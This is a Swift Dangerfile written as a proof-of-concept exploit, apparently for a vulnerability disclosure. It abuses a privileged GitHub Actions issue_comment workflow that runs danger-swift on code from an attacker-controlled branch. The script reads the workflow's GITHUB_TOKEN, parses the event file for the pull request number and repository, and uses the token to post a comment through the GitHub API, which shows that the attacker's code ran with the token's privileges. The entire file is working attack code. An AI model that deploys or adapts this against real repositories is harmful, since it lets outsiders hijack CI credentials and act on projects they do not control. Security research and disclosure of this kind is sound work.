import Foundation
#if canImport(FoundationNetworking)
import FoundationNetworking
#endif

// PoC marker: this code lives in an attacker-controlled branch and is
// executed by danger-swift inside the privileged issue_comment workflow.
print("GAB_POC_DANGERFILE_EXECUTED v1")

let env = ProcessInfo.processInfo.environment
let token = env["GITHUB_TOKEN"] ?? ""
print("GAB_POC token_present=\(!token.isEmpty) token_len=\(token.count)")

var prNumber = 0
var fullName = env["GITHUB_REPOSITORY"] ?? ""
if let path = env["GITHUB_EVENT_PATH"],
   let data = FileManager.default.contents(atPath: path),
   let obj = try? JSONSerialization.jsonObject(with: data) as? [String: Any] {
    if let issue = obj["issue"] as? [String: Any], let n = issue["number"] as? Int {
        prNumber = n
    }
    if let repo = obj["repository"] as? [String: Any], let fn = repo["full_name"] as? String {
        fullName = fn
    }
}
print("GAB_POC pr=\(prNumber) repo=\(fullName)")

// Prove code execution *and* workflow-token access with an observable effect.
if prNumber > 0 && !token.isEmpty {
    let url = URL(string: "https://api.github.com/repos/\(fullName)/issues/\(prNumber)/comments")!
    var req = URLRequest(url: url)
    req.httpMethod = "POST"
    req.setValue("Bearer \(token)", forHTTPHeaderField: "Authorization")
    req.setValue("application/vnd.github+json", forHTTPHeaderField: "Accept")
    req.setValue("application/json", forHTTPHeaderField: "Content-Type")
    req.httpBody = "{\"body\":\"GAB_POC_DANGERFILE_EXECUTED with the workflow GITHUB_TOKEN\"}".data(using: .utf8)
    let sem = DispatchSemaphore(value: 0)
    URLSession.shared.dataTask(with: req) { data, resp, err in
        let code = (resp as? HTTPURLResponse)?.statusCode ?? -1
        print("GAB_POC comment_status=\(code) err=\(String(describing: err))")
        sem.signal()
    }.resume()
    _ = sem.wait(timeout: .now() + 30)
}
